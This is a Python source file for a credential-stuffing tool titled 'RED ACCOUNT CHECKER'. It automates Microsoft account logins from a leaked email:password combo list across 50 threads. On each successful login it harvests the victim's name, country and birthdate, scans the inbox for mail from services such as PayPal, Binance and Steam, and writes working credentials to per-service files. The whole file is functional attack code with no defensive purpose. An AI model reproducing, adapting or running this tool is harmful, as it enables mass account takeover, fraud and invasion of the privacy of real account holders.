import os, sys, io, time, json, uuid, pycountry
import datetime, requests, threading, concurrent.futures
from colorama import Fore, Style, init
import random
import re
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
from threading import Lock, Semaphore
init(autoreset=True)

# Color definitions
R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
B = Fore.BLUE
M = Fore.MAGENTA
C = Fore.CYAN
W = Fore.WHITE

# Colours
HEADER = Fore.CYAN
HITS_COLOR = Fore.LIGHTGREEN_EX
BAD_COLOR = Fore.LIGHTRED_EX
RETRY_COLOR = Fore.LIGHTYELLOW_EX
TFA_COLOR = Fore.MAGENTA
WHITE = Fore.WHITE
INFO = Fore.CYAN
SUCCESS = Fore.GREEN
ERROR = Fore.RED
WARNING = Fore.YELLOW
MAGENTA = Fore.MAGENTA

class HotmailChecker:
    def __init__(self, log_callback=None):
        self.lock = threading.Lock()
        self.hit = 0
        self.bad = 0
        self.retry = 0
        self.total_combos = 0
        self.processed = 0
        self.linked_accounts = {}
        self.checked_accounts = set()
        self.rate_limit_semaphore = Semaphore(100)
        self.log_callback = log_callback
        self.last_log_time = 0
        self.session = requests.Session()

    def get_country_flag(self, country_code):
        flags = {
            "US": "🇺🇸", "GB": "🇬🇧", "TR": "🇹🇷", "DE": "🇩🇪", "FR": "🇫🇷", "IT": "🇮🇹",
            "ES": "🇪🇸", "RU": "🇷🇺", "CN": "🇨🇳", "JP": "🇯🇵", "KR": "🇰🇷", "BR": "🇧🇷",
            "IN": "🇮🇳", "CA": "🇨🇦", "AU": "🇦🇺", "ID": "🇮🇩", "VN": "🇻🇳", "TH": "🇹🇭"
        }
        return flags.get(country_code.upper() if country_code else "US", "🇺🇳")

    def get_flag(self, country_name):
        try:
            country = pycountry.countries.lookup(country_name)
            return ''.join(chr(127397 + ord(c)) for c in country.alpha_2)
        except LookupError:
            return '🏳'

    def update_progress(self):
        """Update the progress display with current statistics"""
        with self.lock:
            progress_percent = min((self.processed / self.total_combos * 100), 100) if self.total_combos > 0 else 0
            linked_total = sum(self.linked_accounts.values())

            stats_text = (f"Progress: {self.processed}/{self.total_combos} ({progress_percent:.1f}%) | "
                          f"Hits: {linked_total} | Bad: {self.bad} | Retries: {self.retry}")

            sys.stdout.write(f"\r{WHITE}{stats_text} ")
            sys.stdout.flush()

            if self.log_callback and (time.time() - self.last_log_time > 5):
                self.log_callback(stats_text)
                self.last_log_time = time.time()

    def save_account_by_type(self, service_name, email, password):
        """Save account to appropriate service file in Accounts folder"""
        if service_name in services:
            if not os.path.exists("Accounts"):
                os.makedirs("Accounts")

            filename = os.path.join("Accounts", services[service_name]["file"])
            account_line = f"{email}:{password}\n"

            with open(filename, 'a', encoding='utf-8') as f:
                f.write(account_line)

            with self.lock:
                if service_name in self.linked_accounts:
                    self.linked_accounts[service_name] += 1
                else:
                    self.linked_accounts[service_name] = 1

    def get_capture(self, email, password, token, cid):
        try:
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            response = requests.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=30).json()
            name = response.get('names', [{}])[0].get('displayName', 'Unknown')
            country = response.get('accounts', [{}])[0].get('location', 'Unknown')
            flag = self.get_flag(country)

            try:
                birthdate = "{:04d}-{:02d}-{:02d}".format(
                    response["accounts"][0]["birthYear"],
                    response["accounts"][0]["birthMonth"],
                    response["accounts"][0]["birthDay"]
                )
            except (KeyError, IndexError):
                birthdate = "Unknown"

            url = f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0"
            headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": f"{cid}",
                "x-req-source": "Mini",
                "authorization": f"Bearer {token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N) AppleWebKit/537.36",
                "action": "StartupData",
                "x-owa-correlationid": f"{cid}",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            inbox_response = requests.post(url, headers=headers, data="", timeout=30).text

            linked_services = []
            for service_name, service_info in services.items():
                sender = service_info["sender"]
                if sender in inbox_response:
                    count = inbox_response.count(sender)
                    linked_services.append(f"[✔] {service_name} (Messages: {count})")
                    self.save_account_by_type(service_name, email, password)

            linked_services_str = "\n".join(linked_services) if linked_services else "[×] No linked services found."

            capture = f"""
~~~~~~~~~~~~~~ Account INFO ~~~~~~~~~~~~~~
Email : {email}
Password : {password}

Name : {name}
Country : {flag} {country}
Birthdate : {birthdate}

Linked Services :
{linked_services_str}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
            with open('Hotmail-Hits.txt', 'a', encoding='utf-8') as f:
                f.write(capture)

            with self.lock:
                self.hit += 1

        except Exception as e:
            pass
        finally:
            with self.lock:
                self.processed += 1
            self.update_progress()

    def check_account(self, email, password):
        try:
            session = requests.Session()
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = session.get(url1, headers={"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)"}, timeout=15)

            if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
                return {"status": "BAD"}

            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"

            r3 = session.post(post_url, data=login_data, headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

            if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"]):
                return {"status": "BAD"}

            if any(url in r3.text for url in ["identity/confirm", "Abuse", "signedout", "locked"]):
                return {"status": "BAD"}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)

            token_data = {
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }

            r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)

            if r4.status_code != 200 or "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            mspcid = None
            for cookie in session.cookies:
                if cookie.name == "MSPCID":
                    mspcid = cookie.value
                    break
            cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()

            self.get_capture(email, password, access_token, cid)
            return {"status": "HIT"}

        except requests.exceptions.Timeout:
            return {"status": "RETRY"}
        except Exception as e:
            return {"status": "RETRY"}

    def check_combo(self, email, password):
        account_id = f"{email}:{password}"
        if account_id in self.checked_accounts:
            with self.lock:
                self.processed += 1
            self.update_progress()
            return

        self.checked_accounts.add(account_id)

        with self.rate_limit_semaphore:
            time.sleep(random.uniform(0.01, 0.05))
            result = self.check_account(email, password)

            with self.lock:
                if result["status"] == "HIT":
                    pass
                elif result["status"] == "BAD":
                    self.bad += 1
                    self.processed += 1
                elif result["status"] == "RETRY":
                    self.retry += 1
                    self.processed += 1
                else:
                    self.bad += 1
                    self.processed += 1

            self.update_progress()

    def run(self, file_path, num_threads=50):
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [line.strip() for line in f if ":" in line]
            self.total_combos = len(lines)
        except Exception as e:
            return

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = []
            for line in lines:
                try:
                    email, password = line.split(":", 1)
                    futures.append(executor.submit(self.check_combo, email.strip(), password.strip()))
                except:
                    continue
            concurrent.futures.wait(futures)

        if self.log_callback:
            linked_total = sum(self.linked_accounts.values())
            self.log_callback(f"Finished! Total Combos: {self.total_combos}, Hits: {linked_total}, Bad: {self.bad}, Retries: {self.retry}")

# Full service definitions restored
services = {
    "Facebook": {"sender": "security@facebookmail.com", "file": "facebook_accounts.txt"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "instagram_accounts.txt"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "tiktok_accounts.txt"},
    "Twitter": {"sender": "info@x.com", "file": "twitter_accounts.txt"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "linkedin_accounts.txt"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "pinterest_accounts.txt"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "reddit_accounts.txt"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "snapchat_accounts.txt"},
    "Netflix": {"sender": "info@account.netflix.com", "file": "netflix_accounts.txt"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "spotify_accounts.txt"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "twitch_accounts.txt"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "youtube_accounts.txt"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "disneyplus_accounts.txt"},
    "Hulu": {"sender": "account@hulu.com", "file": "hulu_accounts.txt"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "amazonprime_accounts.txt"},
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "amazon_accounts.txt"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "ebay_accounts.txt"},
    "PayPal": {"sender": "service@paypal.com.br", "file": "paypal_accounts.txt"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "binance_accounts.txt"},
    "Steam": {"sender": "noreply@steampowered.com", "file": "steam_accounts.txt"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "xbox_accounts.txt"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "playstation_accounts.txt"},
    "EpicGames": {"sender": "help@acct.epicgames.com", "file": "epicgames_accounts.txt"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "roblox_accounts.txt"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "minecraft_accounts.txt"},
    "Apple": {"sender": "no-reply@apple.com", "file": "apple_accounts.txt"},
    "Uber": {"sender": "no-reply@uber.com", "file": "uber_accounts.txt"},
}

def main():
    print("RED ACCOUNT CHECKER")
    file_path = input("Put Combo File: ")
    checker = HotmailChecker()
    checker.run(file_path)

if __name__ == "__main__":
    main()
